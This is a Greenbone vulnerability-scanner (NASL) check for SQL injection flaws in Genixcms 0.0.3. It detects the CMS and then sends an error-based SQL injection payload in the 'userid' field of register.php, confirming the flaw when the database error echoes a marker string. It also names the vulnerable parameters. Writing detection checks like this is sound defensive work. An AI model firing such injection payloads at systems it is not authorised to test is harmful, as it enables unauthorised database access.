# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805665");
  script_version("2024-02-19T05:05:57+0000");
  script_cve_id("CVE-2015-3933", "CVE-2015-5066");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-02-19 05:05:57 +0000 (Mon, 19 Feb 2024)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-11-28 19:26:00 +0000 (Tue, 28 Nov 2017)");
  script_tag(name:"creation_date", value:"2015-06-25 15:38:34 +0530 (Thu, 25 Jun 2015)");
  script_name("Genixcms Multiple SQL Injection Vulnerabilities (Jun 2015)");

  script_tag(name:"summary", value:"Genixcms is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - Insufficient validation of input passed via 'email' and 'userid' POST
  parameter to 'register.php' script.

  - Insufficient validation of input passed via 'content' and 'title' fields in
  an add action in the posts page to index.php or the 'q' parameter in the posts
  page to index.php");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data and to inject
  arbitrary web script or HTML.");

  script_tag(name:"affected", value:"Genixcms version 0.0.3");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37363/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37360/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);

if(!http_can_host_php(port:http_port)){
  exit(0);
}

host = http_host_name( port:http_port );

foreach dir (make_list_unique("/", "/genixcms", "/cms", http_cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if('content="GeniXCMS"' >< rcvRes && 'Free and Opensource CMS">GeniXCMS' >< rcvRes)
  {
    url = dir + "/register.php";
    postData = 'userid=%27and%28select%25201%2520from%2520%28select%2520count%28*'+
               '%29%2Cconcat%28version%28%29%2CSQL-Injection-Test%3Cfloor'+
               '%28rand%280%29*2%29%29x%2520from%2520information_schema.tables%25'+
               '20group%2520by%2520x%29a%29and%27&pass1=df&pass2=df&email=asp%40'+
               'gmail.com&register=&token=0jAU0NqrtJGyZj2epsa2GYG6cVlU5dKsKnyzkIY'+
               'qBhY0wy8TpQYtZbf32yAi1R3X3L6jA2c64CK3cF1a';

    sndReq =  string('POST ', url, ' HTTP/1.1\r\n',
                     'Host: ', host, '\r\n',
                     'Accept-Encoding: gzip,deflate\r\n',
                     'Content-Type: application/x-www-form-urlencoded\r\n',
                     'Content-Length: ', strlen(postData), '\r\n\r\n',
                     postData);
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if("SQL-Injection-Test<" >< rcvRes &&
       "You have an error in your SQL syntax" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
